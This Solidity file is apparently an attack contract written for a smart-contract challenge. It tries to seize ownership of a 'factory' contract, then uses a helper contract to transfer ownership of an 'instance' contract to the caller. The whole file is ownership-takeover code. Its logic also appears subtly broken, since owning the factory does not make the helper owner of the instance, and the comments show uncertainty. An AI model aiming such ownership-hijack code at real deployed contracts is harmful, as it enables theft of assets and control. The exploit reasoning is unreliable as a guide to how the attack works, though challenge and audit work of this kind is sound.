// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IOwnable {
    function transferOwnership(address newOwner) external;
}

interface IFactory {
    function transferOwnership(address newOwner) external;
}

contract FactoryHelper {
    address constant FACTORY = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address constant INSTANCE = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    function execute() external {
        // We need to make the factory call transferOwnership on the instance
        // But the factory doesn't have a function to do this
        
        // Let's create a contract that the factory will transfer ownership to
        // Then that contract can transfer ownership of the instance
        
        TransferHelper helper = new TransferHelper();
        IFactory(FACTORY).transferOwnership(address(helper));
        helper.transferInstanceOwnership(msg.sender);
    }
}

contract TransferHelper {
    address constant INSTANCE = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    function transferInstanceOwnership(address newOwner) external {
        IOwnable(INSTANCE).transferOwnership(newOwner);
    }
}